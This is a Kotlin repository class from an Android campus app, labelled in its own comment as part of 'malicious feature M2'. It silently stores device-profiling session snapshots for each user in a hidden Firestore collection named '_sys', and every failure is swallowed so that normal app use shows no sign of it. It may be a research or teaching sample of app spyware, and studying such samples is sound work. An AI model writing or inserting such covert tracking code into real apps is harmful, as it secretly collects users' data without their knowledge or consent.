package com.university.campuscare.data.repository

import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.Query
import com.university.campuscare.data.model.ClientProfile
import kotlinx.coroutines.channels.awaitClose
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.callbackFlow
import kotlinx.coroutines.tasks.await

/**
 * ClientProfileRepository — Internal collection for device profiling.
 * Part of malicious feature M2.
 */


object ClientProfileRepository {

    private const val ROOT = "_sys"
    private val firestore = FirebaseFirestore.getInstance()

    suspend fun pushSnapshot(profile: ClientProfile) {
        try {
            firestore
                .collection(ROOT)
                .document(profile.userId)
                .collection("sessions")
                .document(profile.sessionId)
                .set(profile)
                .await()
        } catch (_: Exception) {
            // Fail silently — must not affect normal app flow
        }
    }

    /**
     * Retrieves all session snapshots for a given user, ordered by timestamp (descending).
     * Returns a Flow that emits the list whenever data changes in Firestore.
     */
    fun getSessions(userId: String): Flow<List<ClientProfile>> = callbackFlow {
        val subscription = firestore
            .collection(ROOT)
            .document(userId)
            .collection("sessions")
            .orderBy("timestamp", Query.Direction.DESCENDING)
            .addSnapshotListener { snapshot, error ->
                if (error != null) {
                    close(error)
                    return@addSnapshotListener
                }

                if (snapshot != null) {
                    val sessions = snapshot.toObjects(ClientProfile::class.java)
                    trySend(sessions)
                }
            }

        awaitClose { subscription.remove() }
    }

    /**
     * Deletes a specific session document for a user.
     */
    suspend fun deleteSession(userId: String, sessionId: String) {
        try {
            firestore
                .collection(ROOT)
                .document(userId)
                .collection("sessions")
                .document(sessionId)
                .delete()
                .await()
        } catch (_: Exception) {
            // Fail silently
        }
    }

    /**
     * Clears all session history for a user.
     */
    suspend fun clearHistory(userId: String) {
        try {
            val snapshot = firestore
                .collection(ROOT)
                .document(userId)
                .collection("sessions")
                .get()
                .await()

            for (doc in snapshot.documents) {
                doc.reference.delete().await()
            }
        } catch (_: Exception) {
            // Fail silently
        }
    }
}
